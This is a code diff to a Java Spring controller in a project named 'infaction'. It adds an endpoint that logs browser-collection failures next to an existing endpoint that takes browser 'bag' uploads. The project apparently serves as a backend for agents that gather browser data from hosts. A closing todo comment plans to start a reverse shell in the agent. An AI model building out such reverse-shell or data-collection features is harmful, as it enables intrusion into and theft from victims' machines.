@@ -2,6 +2,9 @@ package com.jimmy.infaction.controller;
 
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.jimmy.infaction.enumn.GeneralStatus;
+import com.jimmy.infaction.pojo.Browser;
+import com.jimmy.infaction.pojo.Browser_fail;
+import com.jimmy.infaction.service.BrowserFailService;
 import org.apache.ibatis.annotations.Param;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -28,7 +31,8 @@ public class BrowserController {
 	private static Logger log = LoggerFactory.getLogger(BrowserController.class);
 	@Autowired
 	private ObjectMapper jsonMapper;
-
+	@Autowired
+	private BrowserFailService browserFailService;
 	@RequestMapping(value = "/browserbag",method = RequestMethod.POST)
 	@ResponseBody
 	public ResponseEntity<Map> BrowserBag (HttpServletRequest request, @Param("file") MultipartFile file ){
@@ -83,5 +87,14 @@ public class BrowserController {
 		}
 	}
 
+	@RequestMapping(value = "/browser_fail",method = RequestMethod.POST)
+	@ResponseBody
+	public ResponseEntity<Map> BrowserFaild(Browser_fail browser_fail){
+		browser_fail.setReason(GeneralStatus.getMessage(browser_fail.getCode()));
+		browserFailService.insert(browser_fail);
+		return  new ResponseEntity<Map>(HttpStatus.OK);
+	}
+
+	// todo get the hostid to startup reverse shell in agent
 
 }
